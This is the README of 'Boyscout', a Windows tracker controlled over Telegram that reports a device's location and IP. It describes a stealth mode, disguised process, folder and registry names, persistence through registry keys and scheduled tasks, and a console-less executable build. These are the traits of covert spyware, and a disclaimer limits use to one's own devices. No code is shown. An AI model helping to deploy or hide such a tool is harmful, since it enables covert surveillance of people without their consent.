# Boyscout

A Telegram-based location tracker for Windows. Get your device's location via simple bot commands.

## Features

- **Location Tracking** - IP-based geolocation with reverse geocoding
- **Device Info** - Hostname, OS version, public IP
- **Stealth Mode** - Runs hidden in background
- **Persistence** - Survives reboots via Registry & Scheduled Tasks
- **Watchdog** - Auto-restarts if process crashes
- **Modular Code** - Clean separation of concerns

## Project Structure

```
Boyscout/
├── main.py              # Entry point
├── config.py            # Your private API keys (gitignored)
├── config.example.py    # Template for users
├── requirements.txt     # Dependencies
├── README.md
└── boyscout/           # Core package
    ├── __init__.py
    ├── bot.py           # Telegram handlers
    ├── device.py        # Device info utilities
    ├── location.py      # Geolocation functions
    └── stealth.py       # Persistence & watchdog
```

## Setup

### 1. Get API Keys

| Service | Required | Purpose | Link |
|---------|----------|---------|------|
| Telegram Bot | Yes | Control interface | [@BotFather](https://t.me/BotFather) |
| Telegram Chat ID | Yes | Authorization | [@userinfobot](https://t.me/userinfobot) |
| OpenCage | Optional | Better addresses | [opencagedata.com](https://opencagedata.com/) |
| LocationIQ | Optional | Backup geocoding | [locationiq.com](https://locationiq.com/) |

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 3. Configure

```bash
cp config.example.py config.py
```

Edit `config.py` with your API keys:

```python
TELEGRAM_BOT_TOKEN = "your-bot-token"
YOUR_TELEGRAM_CHAT_ID = "your-chat-id"
```

### 4. Run

```bash
python main.py
```

## Commands

| Command | Description |
|---------|-------------|
| `/start` | Show help menu |
| `/location` | Get current device location |
| `/info` | Get device information |
| `/help` | Show help menu |

## Configuration Options

In `config.py`:

```python
ENABLE_STEALTH_MODE = True  # Set to False for visible/debug mode

STEALTH_CONFIG = {
    'process': 'YourProcessName.exe',      # Hidden process name
    'folder': 'Your\\Hidden\\Folder',       # Hidden folder path
    'service': 'Your Service Name',         # Scheduled task name
    'registry_key': 'YourRegistryKey'       # Registry key name
}
```

## Building Executable

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole main.py
```

## Disclaimer

This tool is intended for tracking your own devices only. Unauthorized use on devices you don't own is illegal.
